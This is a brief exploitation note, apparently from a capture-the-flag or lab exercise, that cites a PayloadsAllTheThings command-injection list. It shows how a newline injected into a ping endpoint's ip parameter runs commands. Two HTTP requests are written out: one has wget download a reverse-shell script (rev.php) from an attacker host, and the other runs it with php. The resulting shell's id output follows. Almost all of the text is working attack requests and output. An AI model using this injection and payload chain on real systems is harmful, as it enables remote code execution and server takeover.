
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/Intruder/command_exec.txt

use %0a to terminate the ip string and inject commands
```
GET /ping?ip=%0awget+http%3a//10.4.18.63/rev.php
GET /ping?ip=%0aphp+rev.php
```
get a shell
```
$ id
uid=1002(www) gid=1002(www) groups=1002(www)
```

